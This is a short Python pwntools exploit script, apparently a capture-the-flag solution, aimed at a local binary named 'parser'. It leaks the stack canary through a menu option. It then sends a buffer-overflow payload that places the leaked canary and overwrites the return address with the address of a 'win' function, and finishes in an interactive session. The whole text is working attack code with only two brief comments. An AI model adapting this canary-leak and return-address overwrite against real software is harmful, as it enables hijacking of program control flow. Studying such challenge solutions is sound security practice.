from pwn import *

p = process("./parser")

context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1 and sys.argv[1] == 'gdb':

    gdb.attach(p, '''
            set disassembly-flavor intel
            set height 0
            b parser.cpp:72
            c
            ''')

win = 0x0000000000400cb7

# Leak the canary at index 6 on the stack
p.recvuntil(">")
p.sendline("s")
p.sendline("5")
p.recvuntil("length: ")
canary = p.recvline()[:16]
print "canary", canary

p.recvuntil(">")
p.sendline("p")
p.recvuntil(":")

# Unrestricted buffer overflow when length = 0. Add canary and desired return address
payloadmessage = "0" + "A"*24 + canary.decode('hex')[::-1] + 'B'*8 + p64(win)
p.sendline(payloadmessage)

p.recvuntil(">")
p.sendline("q")

p.interactive()